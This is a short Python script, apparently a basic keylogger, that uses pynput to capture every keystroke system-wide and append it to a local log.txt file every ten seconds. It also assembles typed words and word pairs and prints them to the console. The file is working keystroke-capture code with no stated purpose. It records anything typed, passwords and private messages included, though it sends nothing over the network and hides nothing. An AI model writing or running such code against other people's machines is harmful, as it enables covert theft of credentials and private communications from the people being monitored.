from time import sleep
from pynput import keyboard
from datetime import datetime

keylog = []
words = []
current_word = ''
prev_word = ''
line_position = 0

def log():
    global line_position
    with open('log.txt', 'a') as log:
        log.write(''.join(keylog))
        line_position += len(keylog)
        if line_position >= 70:
            log.write('\n')
            line_position = 0

def on_press(key):
    global current_word
    global prev_word
    global words
    try:
        # print(str(key.char))
        keylog.append(str(key.char))

        if str(key.char).isalpha():
            current_word += str(key.char)
    except AttributeError:
        if(str(key)[4:] == 'space'):
            keylog.append(' ')
            # print(' ')

            words.append(current_word)
            print('Current word: ' + current_word)
            print('Word pair: ' + prev_word + ' ' + current_word)
            prev_word = current_word
            current_word = ''
        else:
            keylog.append('<' + str(key)[4:] + '>')
            # print('<' + str(key)[4:] + '>')
        
listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    log()
    keylog = []
    # print('keylog cleared')
    # print('collecting for 10 seconds')
    sleep(10)


    
